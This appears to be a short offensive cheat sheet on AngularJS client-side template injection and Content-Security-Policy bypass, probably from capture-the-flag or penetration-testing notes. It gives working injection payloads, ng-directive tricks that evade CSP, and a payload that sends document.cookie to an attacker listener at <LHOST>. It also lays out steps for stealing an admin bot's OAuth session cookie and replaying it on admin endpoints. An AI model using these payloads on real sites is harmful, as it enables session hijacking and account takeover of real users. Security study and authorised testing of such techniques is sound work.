# AngularJS CSTI + CSP Bypass

Client-Side Template Injection in AngularJS: user-controlled content rendered inside an `ng-app` is evaluated as a template expression. The default `$sce` service blocks many XSS patterns but AngularJS directives can bypass CSP even with `script-src 'none'`.

```javascript
// Basic CSTI payload — injected into any field rendered inside ng-app:
{{constructor.constructor('alert(1)')()}}

// CSP bypass using ng-directives (no <script> needed):
<x ng-app><x class="ng-include: 'x'"></x></x>
// or via ng-click / ng-init when inline events are blocked:
<a href ng-click="$event.view.alert(1)">click</a>
```

Read the admin cookie from a stolen session (CSTI → exfiltrate):
```javascript
{{constructor.constructor('fetch("http://<LHOST>/?c="+document.cookie)')()}}
```

OAuth flow cookie theft — if admin is logged in via OAuth and you can inject CSTI into any rendered content the bot visits:
1. Inject payload that POSTs `document.cookie` to your listener
2. Replay the stolen cookie to access admin-only endpoints

Check the `Content-Security-Policy` header; if `unsafe-eval` is absent and `script-src` is restrictive, the ng-directive CSP bypass above works because AngularJS's `$compile` runs its own expression evaluator, not `eval()`.
